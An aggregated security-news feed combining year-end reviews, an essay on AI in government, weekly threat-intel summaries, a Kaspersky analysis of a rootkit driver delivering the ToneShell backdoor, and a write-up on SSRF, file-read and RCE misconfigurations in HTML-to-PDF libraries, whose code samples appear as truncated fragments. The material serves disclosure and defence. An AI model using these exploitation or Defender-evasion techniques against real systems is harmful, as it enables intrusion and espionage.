A huge “thank you” to all of our readers — newcomers, long-timers and drive-by critics alike. Your engagement this past year here has been tremendous and truly a salve on a handful of dark days. Happily, comeuppance was a strong theme running through our coverage in 2025, with a primary focus on entities that enabled complex and globally-dispersed cybercrime services.Image: Shutterstock, Younes Stiller Kraske.In May 2024, we scrutinized the history and ownership of Stark Industries Solutions Ltd., a “bulletproof hosting” provider that came online just two weeks before Russia invaded Ukraine and served as a primary staging ground for repeated Kremlin cyberattacks and disinformation efforts. A year later, Stark and its two co-owners were sanctioned by the European Union, but our analysis showed those penalties have done little to stop the Stark proprietors from rebranding and transferring considerable network assets to other entities they control.In December 2024, KrebsOnSecurity profiled Cryptomus, a financial firm registered in Canada that emerged as the payment processor of choice for dozens of Russian cryptocurrency exchanges and websites hawking cybercrime services aimed at Russian-speaking customers. In October 2025, Canadian financial regulators ruled that Cryptomus had grossly violated its anti-money laundering laws, and levied a record $176 million fine against the platform.In September 2023, KrebsOnSecurity published findings from researchers who concluded that a series of six-figure cyberheists across dozens of victims resulted from thieves cracking master passwords stolen from the password manager service  in 2022. In a court filing in March 2025, U.S. federal agents investigating a spectacular $150 million cryptocurrency heist said they had reached the same conclusion.Phishing was a major theme of this year’s coverage, which peered inside the day-to-day operations of several voice phishing gangs that routinely carried out elaborate, convincing, and financially devastating cryptocurrency thefts. A Day in the Life of a Prolific Voice Phishing Crew examined how one cybercrime gang abused legitimate services at Apple and Google to force a variety of outbound communications to their users, including emails, automated phone calls and system-level messages sent to all signed-in devices.Image: Shutterstock, ArtHead.An attack drone advertised on a website hosted in the same network as Russia’s largest private education company — Synergy University.In June, KrebsOnSecurity.com was hit by the largest DDoS attack that Google had ever mitigated at the time (we are a grateful guest of Google’s excellent Project Shield offering). Experts blamed that attack on an Internet-of-Things botnet called  that had rapidly grown in size and firepower since its debut in late 2024. Another Aisuru attack on Cloudflare just days later practically doubled the size of the June attack against this website. Not long after that, Aisuru was blamed for a DDoS that again doubled the previous record.However, it has recently become clear that at least some of the disruptive botnet and residential proxy activity attributed to Aisuru last year likely was the work of people responsible for building and testing a powerful botnet known as . Chinese security firm which was the first to chronicle Aisuru’s rise in 2024, recently profiled Kimwolf as easily the world’s biggest and most dangerous collection of compromised machines — with approximately 1.83 million devices under its thumb as of December 17.XLab noted that the Kimwolf author “shows an almost ‘obsessive’ fixation on the well-known cybersecurity investigative journalist Brian Krebs, leaving easter eggs related to him in multiple places.”Image: XLab, Kimwolf Botnet Exposed: The Massive Android Botnet with 1.8 million infected devices.I am happy to report that the first KrebsOnSecurity stories of 2026 will go deep into the origins of Kimwolf, and examine the botnet’s unique and highly invasive means of spreading digital disease far and wide. The first in that series will include a somewhat sobering and global security notification concerning the devices and residential proxy services that are inadvertently helping to power Kimwolf’s rapid growth.Thank you once again for your continued readership, encouragement and support.

In total, the researchers found 14 vulnerabilities in four different programs. All discovered problems are implementation errors, meaning they do not affect the fundamental security of the methods used, but rather their concrete – and indeed flawed – implementation in the respective tool.The focus of the presentation was the popular PGP implementation GnuPG, whose code is generally considered to be well-established. Nevertheless, the security researchers found numerous vulnerabilities, including typical errors when processing C strings through injected null bytes. This allowed, among other things, signatures to be falsely displayed as valid, or it was possible to prepend text to signed data that was neither captured nor exposed as a modification by the signature.The issues found in GnuPG cover a broad spectrum of causes: attackers could exploit clearly erroneous code, provoke misleading output that tempts users into fatal actions. Furthermore, they could inject ANSI sequences that, while correctly processed by GnuPG, lead to virtually arbitrary output in the victim's terminal. The latter can be exploited to give users malicious instructions that only appear to come from GnuPG, or to overwrite legitimate security queries from GnuPG with harmless follow-up questions, causing users to unintentionally approve dangerous actions.Many vulnerabilities still openSome vulnerabilities found have been fixed in the current versions of the affected programs, but this is not the case for many. Partly because patches have been adopted but no new version with them has been released yet, but partly also because the program authors do not see a problem to be corrected in their tool.The researchers particularly praised the reaction to the vulnerability in age: Not only was the error fixed in the various age implementations, but the specification was also updated to prevent the problem. Directly at the hacker congress, age developer Filippo Valsorda even went a step further: He was in the audience of the presentation and used the mandatory Q&A session at the end to thank the researchers for their work. He also presented them with an improvised bug bounty in the form of stickers and pins.The researchers also provide advice on their website on how to avoid the found errors – from both developer and user perspectives. In general, users should also perceive seemingly harmless error messages as serious warnings and avoid cleartext signatures – as recommended by the GnuPG man page. The researchers also suggest rethinking the use of cryptography tools on the command line in general: due to the mentioned ANSI sequences, users can be misled, even if all tools work without errors.This article was originally published in

The technologies of artificial intelligence are already pervading many aspects of democratic government, affecting our lives in ways both large and small. This has occurred largely without our notice or consent. The result is a government incrementally transformed by AI rather than the singular technological overlord of the big screen.Let us begin with the executive branch. One of the most important functions of this branch of government is to administer the law, including the human services on which so many Americans rely. Many of these programs have long been operated by a mix of humans and machines, even if not previously using modern AI tools such as Large Language Models.A salient example is healthcare, where private insurers make widespread use of algorithms to review, approve, and deny coverage, even for recipients of public benefits like Medicare. While Biden-era guidance from the Centers for Medicare and Medicaid Services (CMS) largely blesses this use of AI by Medicare Advantage operators, the practice of overriding the medical care recommendations made by physicians raises profound ethical questions, with life and death implications for about thirty million Americans today.This April, the Trump administration reversed many administrative guardrails on AI, relieving Medicare Advantage plans from the obligation to avoid AI-enabled patient discrimination. This month, the Trump administration took a step further. CMS rolled out an aggressive new program that financially rewards vendors that leverage AI to reject rapidly prior authorization for "wasteful" physician or provider-requested medical services. The same month, the Trump administration also issued an executive order limiting the abilities of states to put consumer and patient protections around the use of AI.This shows both growing confidence in AI’s efficiency and a deliberate choice to benefit from it without restricting its possible harms. Critics of the CMS program have characterized it as effectively establishing a bounty on denying care; AI—in this case—is being used to serve a ministerial function in applying that policy. But AI could equally be used to automate a different policy objective, such as minimizing the time required to approve pre-authorizations for necessary services or to minimize the effort required of providers to achieve authorization.Next up is the judiciary. Setting aside concerns about activist judges and court overreach, jurists are not supposed to decide what law is. The function of judges and courts is to interpret the law written by others. Just as jurists have long turned to dictionaries and expert witnesses for assistance in their interpretation, AI has already emerged as a tool used by judges to infer legislative intent and decide on cases. In 2023, a Colombian judge was the first publicly to use AI to help make a ruling. The first known American federal example came a year later when United States Circuit Judge Kevin Newsom began using AI in his jurisprudence, to provide second "opinions" on the plain language meaning of words in statute. A District of Columbia Court of Appeals similarly used ChatGPT in 2025 to deliver an interpretation of what common knowledge is. And there are more examples from Latin America, the United Kingdom, India, and beyond.Given that these examples are likely merely the tip of the iceberg, it is also important to remember that any judge can unilaterally choose to consult an AI while drafting his opinions, just as he may choose to consult other human beings, and a judge may be under no obligation to disclose when he does.This is not necessarily a bad thing. AI has the ability to replace humans but also to augment human capabilities, which may significantly expand human agency. Whether the results are good or otherwise depends on many factors. These include the application and its situation, the characteristics and performance of the AI model, and the characteristics and performance of the humans it augments or replaces. This general model applies to the use of AI in the judiciary.Each application of AI legitimately needs to be considered in its own context, but certain principles should apply in all uses of AI in democratic contexts. First and foremost, we argue, AI should be applied in ways that decentralize rather than concentrate power. It should be used to empower individual human actors rather than automating the decision-making of a central authority. We are open to independent judges selecting and leveraging AI models as tools in their own jurisprudence, but we remain concerned about Big Tech companies building and operating a dominant AI product that becomes widely used throughout the judiciary.This principle brings us to the legislature. Policymakers worldwide are already using AI in many aspects of lawmaking. In 2023, the first law written entirely by AI was passed in Brazil. Within a year, the French government had produced its own AI model tailored to help the Parliament with the consideration of amendments. By the end of that year, the use of AI in legislative offices had become widespread enough that twenty percent of state-level staffers in the United States reported using it, and another forty percent were considering it.These legislative members and staffers, collectively, face a significant choice: to wield AI in a way that concentrates or distributes power. If legislative offices use AI primarily to encode the policy prescriptions of party leadership or powerful interest groups, then they will effectively cede their own power to those central authorities. AI here serves only as a tool enabling that handover.On the other hand, if legislative offices use AI to amplify their capacity to express and advocate for the policy positions of their principals—the elected representatives—they can strengthen their role in government. Additionally, AI can help them scale their ability to listen to many voices and synthesize input from their constituents, making it a powerful tool for better realizing democracy. We may prefer a legislator who translates his principles into the technical components and legislative language of bills with the aid of a trustworthy AI tool executing under his exclusive control rather than with the aid of lobbyists executing under the control of a corporate patron.Examples from around the globe demonstrate how legislatures can use AI as tools for tapping into constituent feedback to drive policymaking. The European civic technology organization Make.org is organizing large-scale digital consultations on topics such as European peace and defense. The Scottish Parliament is funding the development of open civic deliberation tools such as Comhairle to help scale civic participation in policymaking. And Japanese Diet member Takahiro Anno and his party Team Mirai are showing how political innovators can build purpose-fit applications of AI to engage with voters.AI is a power-enhancing technology. Whether it is used by a judge, a legislator, or a government agency, it enhances an entity’s ability to shape the world. This is both its greatest strength and its biggest danger. In the hands of someone who wants more democracy, AI will help that person. In the hands of a society that wants to distribute power, AI can help to execute that. But, in the hands of another person, or another society, bent on centralization, concentration of power, or authoritarianism, it can also be applied toward those ends.We are not going to be fully governed by AI anytime soon, but we are already being governed with AI—and more is coming. Our challenge in these years is more a social than a technological one: to ensure that those doing the governing are doing so in the service of democracy.This essay was written with Nathan E. Sanders, and originally appeared in Merion West.]]></content:encoded></item><item><title>Goldman Sachs Says Some Clients’ Data May Have Been Exposed in Law Firm Data Breach</title><link>https://databreaches.net/2025/12/29/goldman-sachs-says-some-clients-data-may-have-been-exposed-in-law-firm-data-breach/?pk_campaign=feed&amp;pk_kwd=goldman-sachs-says-some-clients-data-may-have-been-exposed-in-law-firm-data-breach</link><author>Dissent</author><category>databreach</category><pubDate>Mon, 29 Dec 2025 12:00:50 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Blind trust: what is hidden behind the process of creating your PDF file?</title><link>https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/</link><author>admin</author><category>vulns</category><pubDate>Mon, 29 Dec 2025 11:56:59 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA['; //marker 2 $mpdf->WriteHTML($html); $mpdf->Output();
```

After downloading the generated PDF, we can extract the file using the pdfdetach application.

#### Misconfiguration 2. Server-Side Request Forgery (Blind SSRF) and Files or Directories Accessible to External Parties via the watermarkimage tag

_Researcher: Nikita Sveshnikov_

With `showWatermarkImage` enabled ( _marker 1_) in the mpdf/mpdf library’s configuration, we can address local or remote resources on behalf of the server or embed local images in the generated PDF file as a watermark.

Web application source code

```
'; $mpdf->WriteHTML($html); $mpdf->showWatermarkImage = true; // marker 1 $mpdf->Output();
```

As a result, the watermark in the generated PDF file became an arbitrary image.

## The KnpLabs/snappy library

### Description

KnpLabs/snappy is a PHP library for generating thumbnails, snapshots, or PDFs from a URL or an HTML page.

**Identifying the library and its version**

KnpLabs/snappy is a wrapper for wkhtmltopdf/wkhtmltoimage. Therefore, “snappy” will not appear in the PDF document properties. The Application field will show wkhtmltopdf with a version, and the PDF producer will be “Qt”. If you encounter wkhtmltopdf older than 0.12.6 (still common in practice), watch out for CVE‑2022‑35583.

### Intentional behavior

The demonstration uses KnpLabs/snappy version 1.4.4.

Installing a specific version of KnpLabs/snappy

```
$ composer require knplabs/knp-snappy:1.4.4
```

We also have to install wkhtmltopdf on the system For the demonstration, we use the latest available version, for example, wkhtmltox\_0.12.6.1-3.jammy\_amd64.deb (https://github.com/wkhtmltopdf/packaging/releases/tag/0.12.6.1-3).

```
$ sudo dpkg -i ./wkhtmltox_0.12.6.1-3.jammy_amd64.deb
```

Both KnpLabs/snappy and wkhtmltopdf vendors warn that any user-supplied HTML data must be sanitized.

#### Intentional behavior 1. Server-Side Request Forgery

_Researcher: Nikita Sveshnikov_

KnpLabs/snappy saves the provided HTML to a file and then processes it using wkhtmltopdf. The wkhtmltopdf library then sends requests to external and internal URLs and ports.

Behavior depends on the tag used:

- The iframe tag ( _marker 1_) enables full Server-Side Request Forgery.
- The  tag enables Server-Side Request Forgery (Blind SSRF) ( _marker 2_).

Web application source code

```
 HTML; $pdf = new Pdf($wkhtmltopdfPath); $pdfContent = $pdf->getOutputFromHtml($maliciousHtmlPayload); header('Content-Type: application/pdf'); header('Content-Disposition: inline; filename="output.pdf"'); echo $pdfContent;
```

Example of successfully obtaining and viewing a server response in the generated PDF with the help of the iframe tag:

### Misconfiguration

#### Misconfiguration 1. Files or Directories Accessible to External Parties

_Researcher: Nikita Sveshnikov_

If `enable-local-file-access` is set ( _marker 1_), the library allows us to embed local images into the generated PDF.

**Note on paths**

The snappy and wkhtmltopdf libraries do not sanitize paths, allowing path traversal. However, by default the current directory for snappy is “/”.

Web application source code

```
 HTML; $pdf = new Pdf($wkhtmltopdfPath); $pdf->setOption('enable-local-file-access', true); // marker 1 $pdfContent = $pdf->getOutputFromHtml($maliciousHtmlPayload); header('Content-Type: application/pdf'); header('Content-Disposition: inline; filename="output.pdf"'); echo $pdfContent;
```

Demonstration of embedding an arbitrary image into the generated PDF file.

## The dompdf/dompdf library

### Description

The dompdf/dompdf library is an open-source PHP library that converts HTML to PDF. It is a style-driven renderer: it downloads and reads external stylesheets, inline style tags, and the style attributes of individual HTML elements. It also supports most presentational HTML attributes.

## Misconfiguration

Severe vulnerabilities have already been found in dompdf/dompdf by other researchers, and the vendor has always promptly addressed such issues. However, misconfigurations can reintroduce dangerous scenarios. Below are the most dangerous scenarios.

The dompdf/dompdf version used in this research is 3.1.0.

```
$ composer require dompdf/dompdf:3.1.0
```

#### Misconfiguration 1. Remote code execution (RCE)

_Researcher: Nikita Sveshnikov_

If `isPhpEnabled` is set to true ( _marker 1_), dompdf/dompdf will execute embedded PHP code from the HTML markup.

Web application source code

```
set('isPhpEnabled', true); // marker 1 $dompdf = new Dompdf($options); // Minimal HTML $html = ''; $dompdf->loadHtml($html); $dompdf->render(); $dompdf->stream("test_php.pdf", ["Attachment" => false]);
```

Let’s read the `/tmp/rce` file to verify that the id command was executed.

#### Misconfiguration 2. Server-Side Request Forgery (Blind SSRF) via the img tag and the src attribute

_Researcher: Nikita Sveshnikov_

With `isRemoteEnabled` enabled ( _marker 1_), dompdf/dompdf will retrieve external files by URL, including images, fonts, and styles. This may lead to SSRF attacks, as the library will attempt to address even internal services of the network.

To mitigate, use `setAllowedRemoteHosts` to restrict dompdf/dompdf to a whitelist of domains and IP addresses; the library will only make requests to those hosts.

Web application source code

```
set('isRemoteEnabled', true); // marker 1 $dompdf = new Dompdf($options); // Minimal HTML $html = ''; $dompdf->loadHtml($html); $dompdf->render(); $dompdf->stream("test_ssrf.pdf", ["Attachment" => false]);
```

Demonstration of server-side request execution.

#### Misconfiguration 3. Files or Directories Accessible to External Parties via the image tag and the src attribute

_Researcher: Nikita Sveshnikov_

The `setChroot` method restricts library access to a specified directory. If chroot is misconfigured, for example, points too high in the directory tree (see _marker 1_), access breaks out of the dompdf folder, allowing `file://` to read any local files the process can access.

Web application source code

```
setChroot('/'); // marker 1 $dompdf = new Dompdf($options); // Minimal HTML $html = ''; $dompdf->loadHtml($html); $dompdf->render(); $dompdf->stream("test_lfr.pdf", ["Attachment" => false]);
```

Demonstration of embedding an arbitrary image into the generated PDF file.

## The LibrePDF/OpenPDF library

### Description

LibrePDF/OpenPDF is a free, open-source Java library for creating and editing PDFs, licensed under LGPL and MPL. OpenPDF is a fork of iText.

### Intentional behavior

The LibrePDF/OpenPDF developer warns that the library is not a sandboxed or hardened environment. It processes input such as file paths, image sources, font names, and HTML content as-is, without performing input validation, authentication, or permission checks (https://github.com/LibrePDF/OpenPDF/blob/master/Security.md).

OpenPDF processes input data such as file paths, image sources, font names, and HTML content as-is, without performing input validation, authentication, or permission checks.

It is the sole responsibility of the application developer to ensure that all input passed into OpenPDF is trusted, sanitized, and safe.

#### Intentional behavior 1. Server-Side Request Forgery (Blind SSRF) and Files or Directories Accessible to External Parties via the img tag and src attribute

_Researchers: Aleksey Solovev, Nikita Sveshnikov_

In LibrePDF/OpenPDF, the HTMLWorker class does not filter `src` attribute values when parsing img tags in HTML. This creates two related risks: embedding local files in the resulting PDF and executing HTTP requests on behalf of the server. If the `src` attribute contains a URL ( _marker 2_), the library attempts to fetch the resource from that address. If it contains a path to a local image ( _marker 1_), the library embeds the file’s contents into the resulting PDF.

Application source code

```
package com.example; import java.io.FileOutputStream; import java.io.IOException; import java.io.StringReader; import com.lowagie.text.Document; import com.lowagie.text.DocumentException; import com.lowagie.text.html.simpleparser.HTMLWorker; import com.lowagie.text.pdf.PdfWriter; public class App { public static void main(String[] args) { Document document = new Document(); try { PdfWriter.getInstance(document, new FileOutputStream("output.pdf")); document.open(); String htmlString = "" + // marker 1 ""; // marker 2 HTMLWorker htmlWorker = new HTMLWorker(document); htmlWorker.parse(new StringReader(htmlString)); htmlWorker.close(); } catch (DocumentException | IOException e) { e.printStackTrace(); } finally { if (document != null && document.isOpen()) { document.close(); } } } }
```

Note that OpenPDF does not support all HTML features, which can complicate page layout.

#### Intentional behavior 2. Server-Side Request Forgery (Blind SSRF) and Files or Directories Accessible to External Parties via the img tag and src attribute

_Researcher: Nikita Sveshnikov_

A similar mechanism exists in the `HtmlParser` class, which likewise accepts unrestricted paths in the `img` tag’s `src` attribute, both absolute ( _marker 2_) and relative ( _marker 1_). `HtmlParser` is susceptible to Blind SSRF ( _marker 3_). We’ll demonstrate all of this in a single application.

Application source code

```
package com.example; import java.io.FileOutputStream; import java.io.IOException; import java.io.StringReader; import com.lowagie.text.Document; import com.lowagie.text.DocumentException; import com.lowagie.text.html.HtmlParser; import com.lowagie.text.pdf.PdfWriter; public class App { public static void main(String[] args) { String htmlContent = "\n" + " \n" + " \n" + " \n" + " \n" + // marker 1 " \n" + " \n" + " \n" + " \n" + // marker 2 " \n" + " \n" + "" + // marker 3 ""; Document document = new Document(); try { PdfWriter.getInstance(document, new FileOutputStream("output.pdf")); document.open(); HtmlParser.parse(document, new StringReader(htmlContent)); } catch (DocumentException | IOException e) { e.printStackTrace(); } finally { if (document != null && document.isOpen()) { document.close(); } } } }
```

Demonstration of server‑side request execution and embedding arbitrary images into the generated PDF.

## Additional notes

### Default images

Sometimes you may not know the absolute or relative paths to private images. One workaround is to embed images that are likely present on the system at known locations into a generated PDF file.

In the figure below, we see images in the `/usr/share/apache2` and `/usr/share/doc` folders. As a proof of concept, you can prepare a list of potential image paths and include them all in the HTML markup passed to the library for PDF rendering.

## Conclusion

After reviewing several HTML-to-PDF libraries, we have reached the following conclusions:

- There is a high likelihood of embedding confidential images via absolute or relative paths, potentially exposing private information.
- There is a risk of SSRF attacks to external and internal addresses and ports from the server.
- By deleting files during vulnerability exploitation, an attacker may cause a system DoS or remove files needed for security checks.
- Pay close attention to regular expressions: poorly written expressions can lead to ReDoS (Regex DoS).

Recommendations for developers: keep these libraries up to date, account for their intentional behaviors and potential misconfigurations, and sanitize untrusted input as needed.

Trends matter because they almost always provide a good indication of what’s coming next.If there’s one thing that became very clear in 2025, it’s that malware is no longer focused on Windows alone. We’ve seen some major developments, especially in campaigns targeting Android and macOS. Unfortunately, many people still don’t realize that protecting smartphones, tablets, and other connected devices is just as essential as securing their laptops.Banking Trojans on Android are not new, but their level of sophistication continues to rise. These threats continue to be a major problem in 2025, often disguising themselves as fake apps to steal credentials or stealthily take over devices. A recent wave of advanced banking Trojans, such as Herodotus, can mimic human typing behaviors to evade detection, highlighting just how refined these attacks have become. Android malware also includes adware that aggressively pushes intrusive ads through free apps, degrading both the user experience and overall security.Several Trojans were found to use overlays, which are fake login screens appearing on top of real banking and cryptocurrency apps. They can read what’s on the screen, so when someone enters their username and password, the malware steals them.One of the most notable developments for Mac users was the expansion of the notorious ClickFix campaign to macOS. Early in 2025, I described how criminals used fake CAPTCHA sites and a clipboard hijacker to provide instructions that led visitors ro infect their own machines with the Lumma infostealer.ClickFix is the name researchers have since given to this type of campaign, where users are tricked into running malicious commands themselves. On macOS, this technique is being used to distribute both AMOS stealers and the Rhadamanthys infostealer.Malware developers increasingly use cross-platform languages such as Rust and Go to create malware that can run on Windows, macOS, Linux, mobile, and even Internet of Things (IoT) devices. This enables flexible targeting and expands the number of potential victims. Malware-as-a-Service (MaaS) models are on the rise, offering these tools for rent or purchase on underground markets, further professionalizing malware development and distribution.We’ve also seen consistent growth in Remote Access Trojan (RAT) activity, often used as an initial infection method. There’s also been a rise in finance-focused attacks, including cryptocurrency and banking-related targets, alongside widespread stealer malware driving data breaches.What does this mean for 2026?Taken together, these trends point to a clear shift. Cybercriminals are increasingly focusing on operating systems beyond Windows, combining advanced techniques and social engineering tailored specifically to mobile and macOS.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>29th December – Threat Intelligence Report</title><link>https://research.checkpoint.com/2025/29th-december-threat-intelligence-report/</link><author>lorenf</author><category>threatintel</category><pubDate>Mon, 29 Dec 2025 11:33:48 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[Romanian Waters, the country’s national water management authority, was hit by a ransomware attack that resulted in nearly 1,000 computer systems across national and regional offices being encrypted. The attack affected geographic information systems, databases, email, web servers, and Windows workstations. Operational technology controlling water infrastructure was not impacted, and no data leakage has been reported, but key IT services were disrupted across the organization.France’s postal service La Poste has suffered a cyber-attack that disrupted key digital systems, impacting online parcel tracking, mail distribution, and banking services for customers of both the postal service and La Banque Postale. Some services were temporarily unavailable, with no evidence of data compromise. The attack was claimed by the pro-Russian hacktivist group NoName057(16).Insurance giant Aflac has confirmed a data breach they experienced in June that resulted in the theft of sensitive files containing insurance claims, health data and Social Security numbers. The breach affected personal details of approximately 22.7 million individuals in its US business. The attack has been attributed to Scattered Spider threat group.Point Harmony Endpoint provides protection against this threatJapan’s leading carmaker Nissan Motor Corporation has acknowledged a data breach that resulted in the exposure of personal information for approximately 21,000 customers from Nissan Fukuoka Sales Corporation including names, addresses, phone numbers, email addresses, and sales operation data. The incident occurred after unauthorized access to Red Hat data servers led to the leak, but financial data was not affected. The Crimson Collective threat actor claimed responsibility for the initial breach, with ShinyHunters later hosting samples of the stolen data.Trust Wallet, a popular non-custodial cryptocurrency wallet, has disclosed a cyber-attack involving a compromised Chrome extension update. The attack exfiltrated sensitive wallet data, including seed phrases, to a malicious domain, resulting in at least $7 million in losses. The incident primarily affected users of Chrome extension version 2.68.0, allowing attackers to drain wallets.Ubisoft’s live service game Rainbow Six Siege (R6) has confirmed a cyber-attack in which threat actors abused internal systems to manipulate bans, unlock all cosmetics and developer-only skins, and distribute around $13.33 million worth of in-game currency worldwide.Baker University has encountered a data breach that resulted in attackers accessing its network and stealing sensitive information belongs to 53,624 students, alumni, staff, and affiliates of the university, such as names, Social Security numbers, financial account details, and medical records.VULNERABILITIES AND PATCHESA high-severity memory-read vulnerability, CVE-2025-14847, dubbed “MongoBleed” has been identified in multiple MongoDB Server versions, allowing unauthenticated remote attackers to exploit a zlib implementation flaw and potentially access uninitialized heap memory. The issue, caused by improper handling of length parameter inconsistency (CWE-130), may permit arbitrary code execution and system compromise. Affected versions include MongoDB 4.0 through 8.2.3.Details on a critical serialization injection vulnerability in LangChain Core were disclosed. CVE-2025-68664 (CVSS 9.3) affects langchain-core, where unescaped user-controlled dictionaries with lc keys are treated as trusted objects during deserialization, enabling secret extraction, prompt injection, and potentially arbitrary code execution.A critical buffer overflow vulnerability, CVE-2025-68615, in Net-SNMP’s snmptrapd daemon can be triggered remotely via a specially crafted packet. The issue has a CVSS score of 9.8 and may allow unauthenticated attackers to achieve remote code execution or cause service crashes. Patches are available, and the vulnerability is addressed in Net-SNMP versions 5.9.5 and 5.10.pre2.THREAT INTELLIGENCE REPORTSCheck Point researchers describe a phishing campaign in which attackers abused Google Cloud Application Integration’s “Send Email” workflow to send over 9,000 spoofed Google notification emails from a Google address. The messages targeted manufacturing, technology, and finance sectors and used multi-step redirection through Google domains to lead victims to a Microsoft-themed credential harvesting site. Most victims located in the US, Asia-Pacific, and Europe.Researchers uncovered a two-year Evasive Panda campaign using adversary-in-the-middle DNS poisoning to deliver MgBot via fake updaters and stealthy loaders. The chain used multi-stage shellcode, hybrid encryption, and DLL sideloading to run MgBot in memory, with victim-specific payloads tied to machines via DPAPI and RC5. Attackers poisoned legitimate domains, injected into signed system processes for persistence, and updated configs with hardcoded C2s.Point Harmony Endpoint provides protection against this threatA Webrat campaign leveraged fake GitHub repositories masquerading as exploit and proof-of-concept code for high-severity CVEs, targeting gamers, students, and inexperienced security researchers. The attack uses droppers to elevate privileges, disable Windows Defender, and deploy the Webrat backdoor, enabling remote control, credential theft, keylogging, and device surveillance.Researchers found lotusbail, a malicious npm package masquerading as a WhatsApp Web API library that intercepts messages and steals session/auth data, contacts, and media via WebSocket tampering and device-pairing hijack.

The driver file is signed with an old, stolen, or leaked digital certificate and registers as a mini-filter driver on infected machines. Its end-goal is to inject a backdoor Trojan into the system processes and provide protection for malicious files, user-mode processes, and registry keys.Our analysis indicates that the final payload injected by the driver is a new sample of the ToneShell backdoor, which connects to the attacker’s servers and provides a reverse shell, along with other capabilities. The ToneShell backdoor is a tool known to be used exclusively by the HoneyMyte (aka Mustang Panda or Bronze President) APT actor and is often used in cyberespionage campaigns targeting government organizations, particularly in Southeast and East Asia.The command-and-control servers for the ToneShell backdoor used in this campaign were registered in September 2024 via NameCheap services, and we suspect the attacks themselves to have begun in February 2025. We’ve observed through our telemetry that the new ToneShell backdoor is frequently employed in cyberespionage campaigns against government organizations in Southeast and East Asia, with Myanmar and Thailand being the most heavily targeted.The driver file is signed with a digital certificate from Guangzhou Kingteller Technology Co., Ltd., with a serial number of 08 01 CC 11 EB 4D 1D 33 1E 3D 54 0C 55 A4 9F 7F. The certificate was valid from August 2012 until 2015.We found multiple other malicious files signed with the same certificate which didn’t show any connections to the attacks described in this article. Therefore, we believe that other threat actors have been using it to sign their malicious tools as well. The following image shows the details of the certificate.Technical details of the malicious driverThe filename used for the driver on the victim’s machine is . The registry key created for the driver’s service uses the same name, The malicious driver contains two user-mode shellcodes, which are embedded into the .data section of the driver’s binary file. The shellcodes are executed as separate user-mode threads. The rootkit functionality protects both the driver’s own module and the user-mode processes into which the backdoor code is injected, preventing access by any process on the system.To obfuscate the actual behavior of the driver module, the attackers used dynamic resolution of the required API addresses from hash values.The malicious driver first retrieves the base address of the  and  by calling  with the  set to SYSTEM_MODULE_INFORMATION. It then iterates through this system information and searches for the desired DLLs by name, noting the  of each.Once the base addresses of the libraries are obtained, the driver uses a simple hashing algorithm to dynamically resolve the required API addresses from  and .The hashing algorithm is shown below. The two variants of the seed value provided in the comment are used in the shellcodes and the final payload of the attack.Protection of the driver fileThe malicious driver registers itself with the Filter Manager using  and sets up a pre-operation callback. This callback inspects I/O requests for  and triggers a malicious handler when certain  values are detected. The handler then checks whether the targeted file object is associated with the driver; if it is, it forces the operation to fail by setting  to . The relevant  values include:FileDispositionInformationFileRenameInformationBypassAccessCheckFileDispositionInformationExFileRenameInformationExBypassAccessCheckThese classes correspond to file-delete and file-rename operations. By monitoring them, the driver prevents itself from being removed or renamed – actions that security tools might attempt when trying to quarantine it.Protection of registry keysThe driver also builds a global list of registry paths and parameter names that it intends to protect. This list contains the following entries:ProjectConfiguration\InstancesProjectConfiguration InstanceTo guard these keys, the malware sets up a  routine, registering it through . To do so, it must assign itself an value. Microsoft governs altitude assignments for mini-filters, grouping them into Load Order categories with predefined altitude ranges. A filter driver with a low numerical altitude is loaded into the I/O stack below filters with higher altitudes. The malware uses a hardcoded starting point of  and creates altitude strings in the format , where  ranges from 0 to 10,000.The malware then begins attempting to register the callback using the first generated altitude. If the registration fails with STATUS_FLT_INSTANCE_ALTITUDE_COLLISION, meaning the altitude is already taken, it increments the value and retries. It repeats this process until it successfully finds an unused altitude.The callback monitors four specific registry operations. Whenever one of these operations targets a key from its protected list, it responds with 0xC0000022 (STATUS_ACCESS_DENIED), blocking the action. The monitored operations are:Microsoft designates the  altitude range for the  Load Order Group. The malware’s chosen altitude exceeds this range. Since filters with lower altitudes sit deeper in the I/O stack, the malicious driver intercepts file operations before legitimate low-altitude filters like antivirus components, allowing it to circumvent security checks.Finally, the malware tampers with the altitude assigned to , a key Microsoft Defender driver. It locates the registry entry containing the driver’s altitude and changes it to , effectively preventing WdFilter from being loaded into the I/O stack.Protection of user-mode processesThe malware sets up a list intended to hold protected process IDs (PIDs). It begins with 32 empty slots, which are filled as needed during execution. A status flag is also initialized and set to 1 to indicate that the list starts out empty.Next, the malware uses  to register two callbacks that intercept process-related operations. These callbacks apply to both OB_OPERATION_HANDLE_CREATE and OB_OPERATION_HANDLE_DUPLICATE, and both use a malicious pre-operation routine.This routine checks whether the process involved in the operation has a PID that appears in the protected list. If so, it sets the  field in the  structure to 0, effectively denying any access to the process.The malware also registers a callback routine by calling PsSetCreateProcessNotifyRoutine. These callbacks are triggered during every process creation and deletion on the system. This malware’s callback routine checks whether the parent process ID (PPID) of a process being deleted exists in the protected list; if it does, the malware removes that PPID from the list. This eventually removes the rootkit protection from a process with an injected backdoor, once the backdoor has fulfilled its responsibilities.The driver delivers two user-mode payloads. spawns an  process and injects a small delay-inducing shellcode.  The PID of this new  instance is written to a file for later use.is the final component – the ToneShell backdoor – and is later injected into that same  process.The malicious driver searches for a high-privilege target process by iterating through PIDs and checking whether each process exists and runs under . Once it finds one, it customizes the first payload using random event names, file names, and padding bytes, then creates a named event and injects the payload by attaching its current thread to the process, allocating memory, and launching a new thread.After injection, it waits for the payload to signal the event, reads the PID of the newly created  process from the generated file, and adds it to its protected process list. It then similarly customizes the second payload (ToneShell) using random event name and random padding bytes, then creates a named event and injects the payload by attaching to the process, allocating memory, and launching a new thread.Once the ToneShell backdoor finishes execution, it signals the event. The malware then removes the  PID from the protected list, waits 10 seconds, and attempts to terminate the process.The final stage of the attack deploys , a backdoor previously linked to operations by the HoneyMyte APT group and discussed in earlier reporting (see Malpedia and MITRE). Notably, this is the first time we’ve seen ToneShell delivered through a , giving it protection from user-mode monitoring and benefiting from the rootkit capabilities of the driver that hides its activity from security tools.Earlier ToneShell variants generated a 16-byte GUID using  and stored it as 